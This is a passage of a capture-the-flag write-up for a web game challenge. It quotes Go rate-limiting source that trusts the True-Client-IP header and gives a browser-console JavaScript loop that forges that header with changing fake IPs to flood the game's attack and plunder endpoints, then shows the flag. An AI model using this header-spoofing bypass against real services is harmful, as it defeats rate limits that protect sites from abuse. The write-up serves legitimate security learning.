</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">4</span><span class="">		r</span><span class="token punctuation">.</span><span class="token function">Use</span><span class="token punctuation">(</span><span class="">httprate</span><span class="token punctuation">.</span><span class="token function">LimitByRealIP</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class=""> time</span><span class="token punctuation">.</span><span class="">Second</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">5</span><span class="">		r</span><span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">&quot;/api/new&quot;</span><span class="token punctuation">,</span><span class=""> s</span><span class="token punctuation">.</span><span class="">NewGameHandler</span><span class="token punctuation">)</span></code></pre></div></div>
<p>it looks like our requests are ratelimited to 2 per second by <code class="text-primary bg-black/20 rounded p-1">httprate.LimitByRealIP</code>; naively spamming requests will return <code class="text-primary bg-black/20 rounded p-1">429</code>s and we&#x27;ll still get defeated by the boss.</p>
<p>However, going to the <code class="text-primary bg-black/20 rounded p-1">httprate</code> source code,</p>
<div class="my-4"><p class="text-xs bg-black/10 rounded-t-lg px-4 py-0.5 text-secondary">Code<!-- --> (go)<!-- -->:<!-- --> <button class="hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="token keyword">func</span><span class=""> </span><span class="token function">LimitByRealIP</span><span class="token punctuation">(</span><span class="">requestLimit </span><span class="token builtin">int</span><span class="token punctuation">,</span><span class=""> windowLength time</span><span class="token punctuation">.</span><span class="">Duration</span><span class="token punctuation">)</span><span class=""> </span><span class="token keyword">func</span><span class="token punctuation">(</span><span class="">next http</span><span class="token punctuation">.</span><span class="">Handler</span><span class="token punctuation">)</span><span class=""> http</span><span class="token punctuation">.</span><span class="">Handler </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">2</span><span class="">	</span><span class="token keyword">return</span><span class=""> </span><span class="token function">Limit</span><span class="token punctuation">(</span><span class="">requestLimit</span><span class="token punctuation">,</span><span class=""> windowLength</span><span class="token punctuation">,</span><span class=""> </span><span class="token function">WithKeyFuncs</span><span class="token punctuation">(</span><span class="">KeyByRealIP</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">3</span><span class=""></span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">4</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">5</span><span class=""></span><span class="token keyword">func</span><span class=""> </span><span class="token function">Key</span><span class="token punctuation">(</span><span class="">key </span><span class="token builtin">string</span><span class="token punctuation">)</span><span class=""> </span><span class="token keyword">func</span><span class="token punctuation">(</span><span class="">r </span><span class="token operator">*</span><span class="">http</span><span class="token punctuation">.</span><span class="">Request</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">,</span><span class=""> </span><span class="token builtin">error</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">6</span><span class="">	</span><span class="token keyword">return</span><span class=""> </span><span class="token keyword">func</span><span class="token punctuation">(</span><span class="">r </span><span class="token operator">*</span><span class="">http</span><span class="token punctuation">.</span><span class="">Request</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">,</span><span class=""> </span><span class="token builtin">error</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">7</span><span class="">		</span><span class="token keyword">return</span><span class=""> key</span><span class="token punctuation">,</span><span class=""> </span><span class="token boolean">nil</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">8</span><span class="">	</span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">9</span><span class=""></span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">10</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">11</span><span class=""></span><span class="token keyword">func</span><span class=""> </span><span class="token function">KeyByIP</span><span class="token punctuation">(</span><span class="">r </span><span class="token operator">*</span><span class="">http</span><span class="token punctuation">.</span><span class="">Request</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">,</span><span class=""> </span><span class="token builtin">error</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">12</span><span class="">	ip</span><span class="token punctuation">,</span><span class=""> </span><span class="token boolean">_</span><span class="token punctuation">,</span><span class=""> err </span><span class="token operator">:=</span><span class=""> net</span><span class="token punctuation">.</span><span class="token function">SplitHostPort</span><span class="token punctuation">(</span><span class="">r</span><span class="token punctuation">.</span><span class="">RemoteAddr</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">13</span><span class="">	</span><span class="token keyword">if</span><span class=""> err </span><span class="token operator">!=</span><span class=""> </span><span class="token boolean">nil</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">14</span><span class="">		ip </span><span class="token operator">=</span><span class=""> r</span><span class="token punctuation">.</span><span class="">RemoteAddr
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">15</span><span class="">	</span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">16</span><span class="">	</span><span class="token keyword">return</span><span class=""> </span><span class="token function">canonicalizeIP</span><span class="token punctuation">(</span><span class="">ip</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class=""> </span><span class="token boolean">nil</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">17</span><span class=""></span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">18</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">19</span><span class=""></span><span class="token keyword">func</span><span class=""> </span><span class="token function">KeyByRealIP</span><span class="token punctuation">(</span><span class="">r </span><span class="token operator">*</span><span class="">http</span><span class="token punctuation">.</span><span class="">Request</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">,</span><span class=""> </span><span class="token builtin">error</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">20</span><span class="">	</span><span class="token keyword">var</span><span class=""> ip </span><span class="token builtin">string</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">21</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">22</span><span class="">	</span><span class="token keyword">if</span><span class=""> tcip </span><span class="token operator">:=</span><span class=""> r</span><span class="token punctuation">.</span><span class="">Header</span><span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">&quot;True-Client-IP&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class=""> tcip </span><span class="token operator">!=</span><span class=""> </span><span class="token string">&quot;&quot;</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">23</span><span class="">		ip </span><span class="token operator">=</span><span class=""> tcip
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">24</span><span class="">	</span><span class="token punctuation">}</span><span class=""> </span><span class="token keyword">else</span><span class=""> </span><span class="token keyword">if</span><span class=""> xrip </span><span class="token operator">:=</span><span class=""> r</span><span class="token punctuation">.</span><span class="">Header</span><span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">&quot;X-Real-IP&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class=""> xrip </span><span class="token operator">!=</span><span class=""> </span><span class="token string">&quot;&quot;</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">25</span><span class="">		ip </span><span class="token operator">=</span><span class=""> xrip
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">26</span><span class="">	</span><span class="token punctuation">}</span><span class=""> </span><span class="token keyword">else</span><span class=""> </span><span class="token keyword">if</span><span class=""> xff </span><span class="token operator">:=</span><span class=""> r</span><span class="token punctuation">.</span><span class="">Header</span><span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">&quot;X-Forwarded-For&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class=""> xff </span><span class="token operator">!=</span><span class=""> </span><span class="token string">&quot;&quot;</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">27</span><span class="">		i </span><span class="token operator">:=</span><span class=""> strings</span><span class="token punctuation">.</span><span class="token function">Index</span><span class="token punctuation">(</span><span class="">xff</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;, &quot;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">28</span><span class="">		</span><span class="token keyword">if</span><span class=""> i </span><span class="token operator">==</span><span class=""> </span><span class="token operator">-</span><span class="token number">1</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">29</span><span class="">			i </span><span class="token operator">=</span><span class=""> </span><span class="token function">len</span><span class="token punctuation">(</span><span class="">xff</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">30</span><span class="">		</span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">31</span><span class="">		ip </span><span class="token operator">=</span><span class=""> xff</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="">i</span><span class="token punctuation">]</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">32</span><span class="">	</span><span class="token punctuation">}</span><span class=""> </span><span class="token keyword">else</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">33</span><span class="">		</span><span class="token keyword">var</span><span class=""> err </span><span class="token builtin">error</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">34</span><span class="">		ip</span><span class="token punctuation">,</span><span class=""> </span><span class="token boolean">_</span><span class="token punctuation">,</span><span class=""> err </span><span class="token operator">=</span><span class=""> net</span><span class="token punctuation">.</span><span class="token function">SplitHostPort</span><span class="token punctuation">(</span><span class="">r</span><span class="token punctuation">.</span><span class="">RemoteAddr</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">35</span><span class="">		</span><span class="token keyword">if</span><span class=""> err </span><span class="token operator">!=</span><span class=""> </span><span class="token boolean">nil</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">36</span><span class="">			ip </span><span class="token operator">=</span><span class=""> r</span><span class="token punctuation">.</span><span class="">RemoteAddr
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">37</span><span class="">		</span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">38</span><span class="">	</span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">39</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">40</span><span class="">	</span><span class="token keyword">return</span><span class=""> </span><span class="token function">canonicalizeIP</span><span class="token punctuation">(</span><span class="">ip</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class=""> </span><span class="token boolean">nil</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">41</span><span class=""></span><span class="token punctuation">}</span></code></pre></div></div>
<p>it looks like the way they check the client&#x27;s real IP is through reading the <code class="text-primary bg-black/20 rounded p-1">True-Client-IP</code> header. If we forge this header, then, we should be able to bypass their rate limiting and get the flag.</p>
<p>Occasionally, forged fetches still fail for whatever reason. Still, assuming most fetches still go through, we can spam attacks and plunders with the following console script:</p>
<div class="my-4"><p class="text-xs bg-black/10 rounded-t-lg px-4 py-0.5 text-secondary">Code<!-- --> (js)<!-- -->:<!-- --> <button class="hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="token keyword">let</span><span class=""> i </span><span class="token operator">=</span><span class=""> </span><span class="token number">0</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">2</span><span class=""></span><span class="token keyword control-flow">while</span><span class=""> </span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">3</span><span class="">    </span><span class="token keyword control-flow">try</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">4</span><span class="">        </span><span class="token keyword">const</span><span class=""> </span><span class="token punctuation">{</span><span class=""> total </span><span class="token punctuation">}</span><span class=""> </span><span class="token operator">=</span><span class=""> </span><span class="token keyword control-flow">await</span><span class=""> </span><span class="token punctuation">(</span><span class="token keyword control-flow">await</span><span class=""> </span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">&#x27;/api/plunder&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">5</span><span class="">            </span><span class="token literal-property property">headers</span><span class="token operator">:</span><span class=""> </span><span class="token punctuation">{</span><span class=""> </span><span class="token string-property property">&#x27;True-Client-IP&#x27;</span><span class="token operator">:</span><span class=""> </span><span class="token template-string template-punctuation string">`</span><span class="token template-string interpolation interpolation-punctuation punctuation">${</span><span class="token template-string interpolation">i</span><span class="token template-string interpolation interpolation-punctuation punctuation">}</span><span class="token template-string string">.</span><span class="token template-string interpolation interpolation-punctuation punctuation">${</span><span class="token template-string interpolation">i</span><span class="token template-string interpolation interpolation-punctuation punctuation">}</span><span class="token template-string string">.</span><span class="token template-string interpolation interpolation-punctuation punctuation">${</span><span class="token template-string interpolation">i</span><span class="token template-string interpolation interpolation-punctuation punctuation">}</span><span class="token template-string string">.</span><span class="token template-string interpolation interpolation-punctuation punctuation">${</span><span class="token template-string interpolation">i</span><span class="token template-string interpolation operator">++</span><span class="token template-string interpolation interpolation-punctuation punctuation">}</span><span class="token template-string template-punctuation string">`</span><span class=""> </span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">6</span><span class="">        </span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token method function property-access">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">7</span><span class="">        </span><span class="token keyword control-flow">if</span><span class=""> </span><span class="token punctuation">(</span><span class="">total </span><span class="token operator">&gt;</span><span class=""> </span><span class="token number">800</span><span class="token punctuation">)</span><span class=""> </span><span class="token keyword control-flow">break</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">8</span><span class="">    </span><span class="token punctuation">}</span><span class=""> </span><span class="token keyword control-flow">catch</span><span class=""> </span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">9</span><span class=""></span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">10</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">11</span><span class=""></span><span class="token keyword">let</span><span class=""> health </span><span class="token operator">=</span><span class=""> </span><span class="token number">2000</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">12</span><span class=""></span><span class="token keyword control-flow">while</span><span class=""> </span><span class="token punctuation">(</span><span class="">health </span><span class="token operator">&gt;=</span><span class=""> </span><span class="token number">0</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">13</span><span class="">    </span><span class="token keyword control-flow">try</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">14</span><span class="">        </span><span class="token keyword">const</span><span class=""> </span><span class="token punctuation">{</span><span class=""> amount </span><span class="token punctuation">}</span><span class=""> </span><span class="token operator">=</span><span class=""> </span><span class="token keyword control-flow">await</span><span class=""> </span><span class="token punctuation">(</span><span class="token keyword control-flow">await</span><span class=""> </span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">&#x27;/api/attack&#x27;</span><span class="token punctuation">,</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">15</span><span class="">            </span><span class="token literal-property property">headers</span><span class="token operator">:</span><span class=""> </span><span class="token punctuation">{</span><span class=""> </span><span class="token string-property property">&#x27;True-Client-IP&#x27;</span><span class="token operator">:</span><span class=""> </span><span class="token template-string template-punctuation string">`</span><span class="token template-string interpolation interpolation-punctuation punctuation">${</span><span class="token template-string interpolation">i</span><span class="token template-string interpolation interpolation-punctuation punctuation">}</span><span class="token template-string string">.</span><span class="token template-string interpolation interpolation-punctuation punctuation">${</span><span class="token template-string interpolation">i</span><span class="token template-string interpolation interpolation-punctuation punctuation">}</span><span class="token template-string string">.</span><span class="token template-string interpolation interpolation-punctuation punctuation">${</span><span class="token template-string interpolation">i</span><span class="token template-string interpolation interpolation-punctuation punctuation">}</span><span class="token template-string string">.</span><span class="token template-string interpolation interpolation-punctuation punctuation">${</span><span class="token template-string interpolation">i</span><span class="token template-string interpolation operator">++</span><span class="token template-string interpolation interpolation-punctuation punctuation">}</span><span class="token template-string template-punctuation string">`</span><span class=""> </span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">16</span><span class="">        </span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token method function property-access">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">17</span><span class="">        health </span><span class="token operator">-=</span><span class=""> amount</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">18</span><span class="">    </span><span class="token punctuation">}</span><span class=""> </span><span class="token keyword control-flow">catch</span><span class=""> </span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none">19</span><span class=""></span><span class="token punctuation">}</span></code></pre></div></div>
<p><a href="https://gist.github.com/user-attachments/assets/f70ea636-2fe1-4ace-a8d2-204aac7b2f85">dojo.webm</a></p>
<p>Once we&#x27;ve won, all we need to do is check the websocket to get the flag:</p>
<p><img src="https://gist.github.com/user-attachments/assets/c53bedee-58cf-47c3-9f7a-acecaa9c7019" alt="image"/></p>
<div class="my-4"><p class="text-xs bg-black/10 rounded-t-lg px-4 py-0.5 text-secondary">Code<!-- -->:<!-- --> <button class="hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="">bctf{D3FAul7_rA73_l1m17_fUnc710N5_aR3_5caRy}</span></code></pre></div></div></main></div><!--$--><!--/$--><!--$--><!--/$--></main><script src="/_next/static/chunks/webpack-50d183473e3f8178.js" async=""></script><script>(self.__next_f=self.__next_f||[]).push([0])</script><script>self.__next_f.push([1,"1:\"$Sreact.fragment\"\n2:I[87555,[],\"\"]\n3:I[31295,[],\"\"]\n4:I[6874,[\"874\",\"static/chunks/874-c62c375efd21db20.js\",\"319\",\"static/chunks/app/writeups/layout-0d6432ad4376bd82.js\"],\"\"]\n6:I[59665,[],\"MetadataBoundary\"]\n8:I[59665,[],\"OutletBoundary\"]\nb:I[74911,[],\"AsyncMetadataOutlet\"]\nd:I[59665,[],\"ViewportBoundary\"]\nf:I[26614,[],\"\"]\n:HL[\"/_next/static/media/e4af272ccee01ff0-s.p.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n:HL[\"/_next/static/css/cd9eb1f13d7f01c4.css\",\"style\"]\n"])</script><script>self.__next_f.push([1,"0:{\"P\":null,\"b\":\"imopLk_XKqn6uMLrmAEB2\",\"p\":\"\",\"c\":[\"\",\"writeups\",\"b5f47ad77ea136d07cfaf15980fedf4c\"],\"i\":false,\"f\":[[[\"\",{\"children\":[\"writeups\",{\"children\":[[\"id\",\"b5f47ad77ea136d07cfaf15980fedf4c\",\"d\"],{\"children\":[\"__PAGE__\",{}]}]}]},\"$undefined\",\"$undefined\",true],[\"\",[\"$\",\"$1\",\"c\",{\"children\":[[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/cd9eb1f13d7f01c4.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\",\"nonce\":\"$undefined\"}]],[\"$\",\"html\",null,{\"className\":\"dark scroll-smooth\",\"children\":[[\"$\",\"head\",null,{\"children\":[\"$\",\"meta\",null,{\"charSet\":\"utf-8\"}]}],[\"$\",\"body\",null,{\"className\":\"text-dark dark:text-white dark:bg-midnight\",\"style\":{\"fontFamily\":\"'Inter', 'Inter Fallback'\",\"fontStyle\":\"normal\"},\"children\":[\"$\",\"$L2\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L3\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":[[\"$\",\"div\",null,{\"className\":\"h-screen flex items-center justify-center\",\"children\":[\"$\",\"main\",null,{\"className\":\"relative pl-14\",\"children\":[[\"$\",\"svg\",null,{\"stroke\":\"currentColor\",\"fill\":\"currentColor\",\"strokeWidth\":\"0\",\"viewBox\":\"0 0 512 512\",\"className\":\"absolute left-0 top-2 text-5xl text-grapefruit\",\"children\":[\"$undefined\",[[\"$\",\"path\",\"0\",{\"d\":\"M256 48C140.559 48 48 140.559 48 256c0 115.436 92.559 208 208 208 115.435 0 208-92.564 208-208 0-115.441-92.564-208-208-208zm104.002 282.881l-29.12 29.117L256 285.117l-74.881 74.881-29.121-29.117L226.881 256l-74.883-74.881 29.121-29.116L256 226.881l74.881-74.878 29.12 29.116L285.119 256l74.883 74.881z\",\"children\":\"$undefined\"}]]],\"style\":{\"color\":\"$undefined\"},\"height\":\"1em\",\"width\":\"1em\",\"xmlns\":\"http://www.w3.org/2000/svg\"}],[\"$\",\"h1\",null,{\"className\":\"font-bold text-7xl underline decoration-grapefruit mb-5\",\"children\":\"404.\"}],[\"$\",\"p\",null,{\"children\":\"Your requested page was not found.\"}],[\"$\",\"$L4\",null,{\"href\":\"/\",\"className\":\"font-medium text-inherit\",\"children\":\"Return to home →\"}]]}]}],[]],\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]}]]}]]}],{\"children\":[\"writeups\",[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"main\",null,{\"className\":\"container pt-20 pb-24\",\"children\":[[\"$\",\"$L4\",null,{\"href\":\"/\",\"className\":\"text-secondary text-sm mb-10 -ml-5 block w-max\",\"children\":\"← Back to home\"}],[\"$\",\"$L2\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L3\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]]}]]}],{\"children\":[[\"id\",\"b5f47ad77ea136d07cfaf15980fedf4c\",\"d\"],[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"$L2\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L3\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]]}],{\"children\":[\"__PAGE__\",[\"$\",\"$1\",\"c\",{\"children\":[\"$L5\",[\"$\",\"$L6\",null,{\"children\":\"$L7\"}],null,[\"$\",\"$L8\",null,{\"children\":[\"$L9\",\"$La\",[\"$\",\"$Lb\",null,{\"promise\":\"$@c\"}]]}]]}],{},null,false]},null,false]},null,false]},null,false],[\"$\",\"$1\",\"h\",{\"children\":[null,[\"$\",\"$1\",\"EQ0I4QEQ3oh_M9C1f6R7D\",{\"children\":[[\"$\",\"$Ld\",null,{\"children\":\"$Le\"}],[\"$\",\"meta\",null,{\"name\":\"next-size-adjust\",\"conten